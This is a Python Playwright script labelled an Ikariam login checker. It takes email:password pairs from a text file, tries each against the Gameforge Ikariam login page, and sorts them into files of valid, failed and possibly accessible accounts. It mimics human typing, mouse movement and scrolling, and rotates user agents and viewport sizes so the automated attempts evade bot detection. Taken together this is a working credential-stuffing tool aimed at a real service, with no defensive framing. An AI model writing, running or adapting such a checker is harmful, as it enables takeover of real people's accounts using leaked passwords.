import asyncio
import random

from pathlib import Path
from datetime import datetime

from playwright.async_api import async_playwright

# =========================================================
# CONFIG
# =========================================================

LOGIN_URL = "https://lobby.ikariam.gameforge.com/pt_PT/"

HEADLESS = False
TIMEOUT = 45000

MIN_DELAY = 5
MAX_DELAY = 10

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).parent

accounts_path = BASE_DIR / "accounts.txt"

valid_path = BASE_DIR / "validas.txt"
invalid_path = BASE_DIR / "nao_acessiveis.txt"
accessible_path = BASE_DIR / "acessiveis.txt"

# =========================================================
# CLEAN OUTPUT FILES
# =========================================================

for file in [
    valid_path,
    invalid_path,
    accessible_path
]:
    if file.exists():
        file.unlink()

# =========================================================
# USER AGENTS
# =========================================================

USER_AGENTS = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36",

    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36"

]

# =========================================================
# HELPERS
# =========================================================

def log(msg):

    now = datetime.now().strftime("%H:%M:%S")

    print(f"[{now}] {msg}")

def save(path, line):

    with open(path, "a", encoding="utf-8") as f:

        f.write(line + "\n")

# =========================================================
# LOAD ACCOUNTS
# =========================================================

accounts = []

if accounts_path.exists():

    with open(accounts_path, "r", encoding="utf-8") as f:

        for line in f:

            line = line.strip()

            if ":" not in line:
                continue

            try:

                email = line.split(":")[0].strip()

                password = ":".join(
                    line.split(":")[1:]
                ).strip()

                if email and password:

                    accounts.append(
                        (email, password)
                    )

            except:
                pass

# =========================================================
# HUMAN TYPE
# =========================================================

async def human_type(locator, text):

    await locator.click()

    for char in text:

        await locator.type(
            char,
            delay=random.randint(80, 180)
        )

        if random.randint(1, 10) == 5:

            await asyncio.sleep(
                random.uniform(0.1, 0.3)
            )

# =========================================================
# HUMAN CLICK
# =========================================================

async def human_click(page, locator):

    box = await locator.bounding_box()

    if not box:
        return False

    x = box["x"] + random.randint(5, 30)
    y = box["y"] + random.randint(5, 15)

    await page.mouse.move(
        x,
        y,
        steps=random.randint(15, 40)
    )

    await page.wait_for_timeout(
        random.randint(300, 900)
    )

    await locator.click()

    return True

# =========================================================
# ACCEPT COOKIES
# =========================================================

async def accept_cookies(page):

    selectors = [

        'button:has-text("Aceitar")',
        'button:has-text("Accept")',

        'text="Aceitar"',
        'text="Accept"'

    ]

    for selector in selectors:

        try:

            button = page.locator(selector).first

            if await button.count() > 0:

                await human_click(
                    page,
                    button
                )

                log("[INFO] Cookies accepted")

                await page.wait_for_timeout(
                    random.randint(1000, 2500)
                )

                return

        except:
            pass

# =========================================================
# OPEN LOGIN TAB
# =========================================================

async def open_login_tab(page):

    selectors = [

        'text="Iniciar sessão"',
        'text="Iniciar Sessão"',
        'text="Entrar"',
        'text="Login"'

    ]

    for selector in selectors:

        try:

            button = page.locator(selector).first

            if await button.count() > 0:

                await human_click(
                    page,
                    button
                )

                log("[INFO] Login tab opened")

                await page.wait_for_timeout(
                    random.randint(1500, 3000)
                )

                return True

        except:
            pass

    return False

# =========================================================
# CLICK LOGIN BUTTON
# =========================================================

async def click_login_button(page):

    selectors = [

        '#loginForm button.button-primary',

        'button.button-primary',

        'button[type="submit"]',

        'button:has-text("INICIAR SESSÃO")',

        'button:has-text("Iniciar sessão")',

        'button:has-text("Login")'

    ]

    for selector in selectors:

        try:

            button = page.locator(selector).first

            await button.wait_for(
                state="visible",
                timeout=5000
            )

            if await button.is_visible():

                log(
                    f"[INFO] Clicking => {selector}"
                )

                await human_click(
                    page,
                    button
                )

                return True

        except:
            pass

    return False

# =========================================================
# CHECK ACCOUNT
# =========================================================

async def check_account(email, password):

    print("\n===================================")
    print(f"EMAIL => {email}")
    print(f"PASSWORD => {password}")
    print("===================================\n")

    log(f"[CHECKING] {email}")

    async with async_playwright() as p:

        browser = await p.chromium.launch(
            headless=HEADLESS,
            slow_mo=40
        )

        context = await browser.new_context(

            locale="pt-PT",

            viewport={
                "width": random.randint(1280, 1700),
                "height": random.randint(720, 1000)
            },

            user_agent=random.choice(
                USER_AGENTS
            )

        )

        page = await context.new_page()

        try:

            # =================================================
            # OPEN WEBSITE
            # =================================================

            log("[INFO] Opening website")

            await page.goto(
                LOGIN_URL,
                wait_until="domcontentloaded",
                timeout=TIMEOUT
            )

            await page.wait_for_timeout(
                random.randint(3000, 5000)
            )

            # =================================================
            # HUMAN SCROLL
            # =================================================

            await page.mouse.wheel(
                0,
                random.randint(300, 1200)
            )

            await page.wait_for_timeout(
                random.randint(1000, 2500)
            )

            # =================================================
            # ACCEPT COOKIES
            # =================================================

            await accept_cookies(page)

            # =================================================
            # OPEN LOGIN TAB
            # =================================================

            opened = await open_login_tab(page)

            if not opened:

                log("[ERROR] Login tab not found")

                save(
                    invalid_path,
                    f"{email}:{password}"
                )

                return

            # =================================================
            # INPUTS
            # =================================================

            email_input = page.locator(
                'input[type="email"]'
            ).first

            password_input = page.locator(
                'input[type="password"]'
            ).first

            await email_input.wait_for(timeout=10000)

            await password_input.wait_for(timeout=10000)

            # =================================================
            # TYPE EMAIL
            # =================================================

            await human_type(
                email_input,
                email
            )

            await page.wait_for_timeout(
                random.randint(1000, 2500)
            )

            # =================================================
            # TYPE PASSWORD
            # =================================================

            await human_type(
                password_input,
                password
            )

            await page.wait_for_timeout(
                random.randint(1500, 3500)
            )

            # =================================================
            # PRESS ENTER
            # =================================================

            try:

                await password_input.press("Enter")

                log("[INFO] ENTER pressed")

            except:
                pass

            await page.wait_for_timeout(
                random.randint(4000, 7000)
            )

            # =================================================
            # CLICK BUTTON IF NEEDED
            # =================================================

            current_url = page.url.lower()

            if "login" in current_url:

                clicked = await click_login_button(page)

                if clicked:

                    log("[INFO] Login button clicked")

            # =================================================
            # WAIT RESPONSE
            # =================================================

            log("[INFO] Waiting server response")

            await page.wait_for_timeout(
                random.randint(8000, 12000)
            )

            current_url = page.url.lower()

            body = (
                await page.locator("body").inner_text()
            ).lower()

            # =================================================
            # VALID ACCOUNT
            # =================================================

            if (
                "/hub" in current_url
                or "última vez jogado" in body
                or "play now" in body
                or "a minha conta" in body
            ):

                print("\n==============================")
                print(f"[VALID ACCOUNT] {email}")
                print("==============================\n")

                save(
                    valid_path,
                    f"{email}:{password}"
                )

            # =================================================
            # NON ACCESSIBLE ACCOUNT
            # =================================================

            elif (

                "palavra-passe incorreta" in body
                or "credenciais inválidas" in body
                or "wrong password" in body
                or "invalid password" in body
                or "login failed" in body
                or "email inválido" in body
                or "e-mail inválido" in body
                or "conta não encontrada" in body
                or "email não encontrado" in body
                or "account does not exist" in body
                or "unknown account" in body

            ):

                print("\n==============================")
                print(f"[NOT ACCESSIBLE] {email}")
                print("==============================\n")

                save(
                    invalid_path,
                    f"{email}:{password}"
                )

            # =================================================
            # POSSIBLE ACCESSIBLE
            # =================================================

            else:

                print("\n==============================")
                print(f"[ACCESSIBLE/POSSIBLE] {email}")
                print("==============================\n")

                save(
                    accessible_path,
                    f"{email}:{password}"
                )

        except Exception as e:

            log(f"[ERROR] {email} -> {e}")

            save(
                invalid_path,
                f"{email}:{password}"
            )

        finally:

            await browser.close()

# =========================================================
# MAIN
# =========================================================

async def main():

    print("\n===================================")
    print(" IKARIAM LOGIN CHECKER ")
    print("===================================\n")

    log(
        f"Loaded {len(accounts)} accounts"
    )

    if len(accounts) == 0:

        print("\nNo accounts found.\n")

        return

    for email, password in accounts:

        await check_account(
            email,
            password
        )

        wait = random.randint(
            MIN_DELAY,
            MAX_DELAY
        )

        log(f"[WAITING] {wait}s")

        await asyncio.sleep(wait)

    print("\n===================================")
    print(" FINISHED ")
    print("===================================\n")

# =========================================================
# START
# =========================================================

if __name__ == "__main__":

    asyncio.run(main())